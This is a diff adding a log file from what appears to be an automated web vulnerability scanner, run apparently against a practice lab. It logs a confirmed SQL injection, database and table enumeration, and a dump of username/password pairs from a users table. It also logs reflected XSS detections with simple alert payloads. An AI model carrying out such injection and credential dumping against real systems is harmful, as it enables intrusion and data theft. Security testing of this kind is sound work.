@@ -1,0 +1,16 @@
+[INFO] 2026-08-14 14:58:40,484 - 二次验证通过，确认字符型SQL注入
+[INFO] 2026-08-14 14:58:40,547 - 列数猜解完成：3 列
+[INFO] 2026-08-14 14:58:40,607 - 二次验证通过，确认字符型SQL注入
+[INFO] 2026-08-14 14:58:40,670 - 列数猜解完成：3 列
+[INFO] 2026-08-14 14:58:40,677 - 定位到回显位：[1, 2, 3]
+[INFO] 2026-08-14 14:58:40,677 - 过滤后可用回显位：[2, 3]
+[INFO] 2026-08-14 14:58:40,685 - 当前数据库名：security
+[INFO] 2026-08-14 14:58:40,692 - 库security下的表：['emails', 'referers', 'uagents', 'users']
+[INFO] 2026-08-14 14:58:40,700 - 表 users 的列：['id', 'username', 'password']
+[INFO] 2026-08-14 14:58:40,719 - 脱取数据：[{'username': 'Dumb', 'password': 'Dumb'}, {'username': 'Angelina', 'password': 'I-kill-you'}, {'username': 'Dummy', 'password': 'p@ssword'}, {'username': 'secure', 'password': 'crappy'}, {'username': 'stupid', 'password': 'stupidity'}, {'username': 'superman', 'password': 'genious'}, {'username': 'batman', 'password': 'mob!le'}, {'username': 'admin', 'password': 'admin'}, {'username': 'admin1', 'password': 'admin1'}, {'username': 'admin2', 'password': 'admin2'}, {'username': 'admin3', 'password': 'admin3'}, {'username': 'dhakkan', 'password': 'dumbo'}, {'username': 'admin4', 'password': 'admin4'}]
+[INFO] 2026-08-17 17:04:15,395 - 检测到反射型XSS，参数:q, payload:<script>alert(1)</script>
+[INFO] 2026-08-17 17:05:28,355 - 检测到反射型XSS，参数:q, payload:<script>alert(1)</script>
+[INFO] 2026-08-17 17:05:35,687 - 检测到反射型XSS，参数:q, payload:<script>alert(1)</script>
+[INFO] 2026-08-17 17:08:02,193 - 检测到反射型XSS，参数:q, payload:<script>alert(1)</script>
+[INFO] 2026-08-17 17:13:22,000 - 检测到反射型XSS，参数:q, payload:<script>alert(1)</script>
+[INFO] 2026-08-17 17:15:31,657 - 检测到反射型XSS，参数:q, payload:<img src=x onerror=alert(1)>
